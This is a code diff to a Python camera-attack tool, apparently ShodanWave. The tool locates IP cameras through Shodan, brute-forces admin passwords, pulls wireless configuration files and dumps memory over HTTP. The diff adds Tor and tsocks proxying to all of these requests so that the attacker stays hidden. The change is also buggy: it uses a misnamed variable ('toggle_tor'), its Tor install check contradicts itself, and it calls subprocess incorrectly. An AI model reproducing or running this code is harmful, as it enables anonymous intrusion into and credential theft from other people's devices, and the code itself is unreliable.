@@ -48,9 +48,9 @@ def main() :
  parser.add_argument('-t','--output', dest="output", default='', type=str, help='Log File')
  parser.add_argument('-l','--limit', dest="limit", type=str, help='Limit the number of registers responsed by Shodan')
  parser.add_argument('-o','--offset', dest="offset", type=str, help='Shodan skips this number of registers from response')
-
+ parser.add_argument('-p','--tor', dest="tor", action='store_true', help='Add Tor Functionality, modify your tsocks config')
  args = parser.parse_args()
-
+ 
  global filename
  filename = args.output
 
@@ -96,6 +96,10 @@ def main() :
   msn_user = ''
   msn_pwd = ''
 
+  global tor_toggle
+  tor_toggle = False
+
+  #FNULL = open(os.devnull, 'w')
 
   try:
 
@@ -114,7 +118,21 @@ def main() :
       print(backgroundColor.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + backgroundColor.ENDC)
       pass
    
-  
+   if args.tor == True :
+      tor_toggle = True
+      check_tor_status = subprocess.Popen(['whereis', 'tor'],shell=False, stdout=subprocess.PIPE)
+      check_tor_status = check_tor_status.stdout.read().decode('utf-8')
+      check_tsocks_status = subprocess.Popen(['whereis', 'tsocks'],shell=False, stdout=subprocess.PIPE)
+      check_tsocks_status = check_tsocks_status.stdout.read().decode('utf-8')
+      if ('/usr/bin/tor' not in check_tor_status) or ('/usr/sbin/tor' not in check_tor_status) :
+         print(backgroundColor.WARNING + "Please Install Tor: apt-get install tor"+ backgroundColor.ENDC)
+         sys.exit()
+      if ('/usr/bin/tsocks' not in check_tsocks_status) :
+          print(backgroundColor.WARNING + "ShodanWave uses Tsocks for wget, pleae install and configure Tsocks: apt-get install tsocks"+ backgroundColor.ENDC)
+          sys.exit()
+      if 'inactive' in check_tor_status :
+         enable_tor = subprocess.Popen(['service tor start'],shell=False, stdout=subprocess.PIPE)
+         print(backgroundColor.WARNING + "Tor was Disabled, Enabling it now."+ backgroundColor.ENDC) 
 
    ShodanModuleExploit = raw_input(backgroundColor.WARNING + "[!] Disable password discovery module? (Yes/no): " + backgroundColor.ENDC)
 
@@ -145,10 +163,15 @@ def main() :
        for password in passwords:
 
         password = password.strip()
-
+        if tor_toggle == True :
+           proxies = {'http': 'socks5://127.0.0.1:9050'}
+        
         headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
-
-        request = requests.get(url, auth=(administrator, password), headers=headers, timeout=0.3)
+        
+        if toggle_tor == True :
+           request = requests.get(url, auth=(administrator, password), headers=headers, proxies=proxies, timeout=1)
+        else :
+           request = requests.get(url, auth=(administrator, password), headers=headers, timeout=0.3)
 
         status = request.status_code
 
@@ -165,8 +188,10 @@ def main() :
              url = "http://%s:%s/get_params.cgi" % (host, port)
 
              headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
-
-             request = requests.get(url, headers=headers, auth=(administrator, password), timeout=0.3)
+             if tor_toggle == True : 
+                request = requests.get(url, headers=headers, auth=(administrator, password), proxies=proxies, timeout=1)
+             else:
+                request = requests.get(url, headers=headers, auth=(administrator, password), timeout=0.3)
 
              response = request.text.split(";\n")
 
@@ -243,7 +268,11 @@ def main() :
       wireless = "http://%s:%s/get_status.cgi" % (host, port)
       headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
 
-      response = requests.get(wireless, headers=headers, timeout=0.3)
+      if tor_toggle == True :
+         response = requests.get(wireless, headers=headers, proxies=proxies, timeout=1)
+      else :
+         response = requests.get(wireless, headers=headers, timeout=0.3)
+
       status = response.status_code
       content = response.text.split(';\n')
 
@@ -269,8 +298,11 @@ def main() :
       url = "http://%s:%s//etc/RT2870STA.dat" % (host, port)
 
       headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
+      if tor_toggle == True :
+         response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
+      else :
+         response = requests.get(url, headers=headers, timeout=0.3)
 
-      response = requests.get(url, headers=headers, timeout=0.3)
       content = response.text.split("\n")
 
       status = response.status_code
@@ -294,7 +326,10 @@ def main() :
       if exploit:
 
        print (backgroundColor.FAIL +"[+] Starting to read memory dump.. this could take a few minutes"+backgroundColor.ENDC)
-       proc = subprocess.Popen("wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
+       if tor_toggle == True :
+          proc = subprocess.Popen("tsocks wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
+       else :
+          proc = subprocess.Popen("wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
        os.system('echo "" > tmpstrings.out')
        time.sleep(1)
        proc2 = subprocess.Popen("tail -f tmpstream.txt | strings >>tmpstrings.out", shell=True, preexec_fn=os.setsid)
@@ -344,12 +379,12 @@ def main() :
 
 
 def log(host, port, country, city, org, product):
-
- file = open(filename, 'a')
- out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (host, port, country, city, org, product)
- file.write(out.encode('utf-8'))
- file.write("*****************" + "\n")
- file.close()
+ if filename != '' :
+    file = open(filename, 'a')
+    out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (host, port, country, city, org, product)
+    file.write(out.encode('utf-8'))
+    file.write("*****************" + "\n")
+    file.close()
 
 
 
